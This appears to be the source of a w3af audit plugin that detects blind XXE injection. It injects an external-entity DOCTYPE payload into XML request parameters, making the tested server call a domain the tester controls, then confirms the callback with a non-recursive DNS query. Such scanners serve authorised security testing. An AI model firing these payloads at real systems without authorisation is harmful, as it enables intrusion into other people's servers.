import w3af.core.data.kb.knowledge_base as kb

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin

from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.options.option_list import OptionList
from w3af.core.data.fuzzer.fuzzer import create_mutants
from w3af.core.data.fuzzer.mutants.xml_mutant import XMLMutant

import w3af.core.controllers.output_manager as om
import w3af.core.data.constants.severity as severity

from w3af.core.data.kb.vuln import Vuln
from w3af.core.controllers.exceptions import HTTPRequestException

import dns.name
import dns.message
import dns.query
import dns.flags


class xxe(AuditPlugin):
	"""
	Identify XXE injection (blind method)

	:author: @s0i37
	"""

	def __init__(self):
		AuditPlugin.__init__(self)
		self._dns_zone = ''
		self._dns_zone_ns = ''

	def audit(self, freq, orig_response):
		if not self._dns_zone_ns:
			om.out.debug("DNS zone not configured!")
			return

		self.fqdn = "xxe.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
		for mutant in create_mutants(freq, ['&a;', ]):
			if isinstance(mutant, XMLMutant):
				mutant.get_dc().doctype = '<!DOCTYPE aa [\n'
				mutant.get_dc().doctype += ' <!ENTITY a SYSTEM "http://{FQDN}">\n'.format( FQDN=self.fqdn )
				mutant.get_dc().doctype += ']>'
				try:
					response = self._uri_opener.send_mutant( mutant, cache=False, timeout=10 )
					if self.check():
						desc = 'XXE injection at: "%s", using'\
							' HTTP method %s. The injectable parameter may be: "%s"'
						desc = desc % ( mutant.get_url(),
										mutant.get_method(),
										mutant.get_token_name() )
						vuln = Vuln.from_mutant('XXE injection vulnerability', desc,
										severity.HIGH, response.id, 'xxe',
										mutant)
						om.out.debug( vuln.get_desc() )
						om.out.vulnerability("XXE injection", severity=severity.HIGH)
				except HTTPRequestException:
					om.out.debug("HTTPRequestException")
				except Exception as e:
					om.out.debug( str(e) )

	def check(self):
		dns_query = dns.message.make_query(self.fqdn, dns.rdatatype.ANY)
		dns_query.flags ^= dns.flags.RD
		resp = dns.query.udp(dns_query, self._dns_zone_ns)
		if len(resp.answer):
			return True

	def _prepare_dns(self):
		if self._dns_zone:
			dns_query = dns.message.make_query(self._dns_zone, dns.rdatatype.NS)
			resp = dns.query.udp(dns_query, '8.8.8.8')
			if len(resp.answer) and len( resp.answer[0] ):
				ns = resp.answer[0][0].to_text()
				dns_query = dns.message.make_query(ns, dns.rdatatype.A)
				resp = dns.query.udp(dns_query, '8.8.8.8')
				if len(resp.answer) and len( resp.answer[0] ):
					self._dns_zone_ns = resp.answer[0][0].to_text()

	def get_options(self):
		"""
		:return: A list of option objects for this plugin.
		"""
		opt_list = OptionList()

		h1 = 'DNS server of this zone must cache any dns-requests.'
		opt = opt_factory('controlled_domain', self._dns_zone, 'caching domain zone', 'string', help=h1)
		opt_list.add(opt)

		return opt_list

	def set_options(self, options_list):
		"""
		This method sets all the options that are configured using the user
		interface generated by the framework using the result of get_options().

		:param options_list: A dictionary with the options for the plugin.
		:return: No value is returned.
		"""
		self._dns_zone = options_list['controlled_domain'].get_value()
		self._prepare_dns()

	def get_long_desc(self):
		"""
		:return: A DETAILED description of the plugin functions and features.
		"""
		return """
		This plugin finds XXE injections (blind method) using dns request.
		In case if XXE is exists the victim will send dns-request. Then we
		send no-recursive dns-request to the same dns-name.

		Only one configurable parameters exists:
		    - controlled_domain
		"""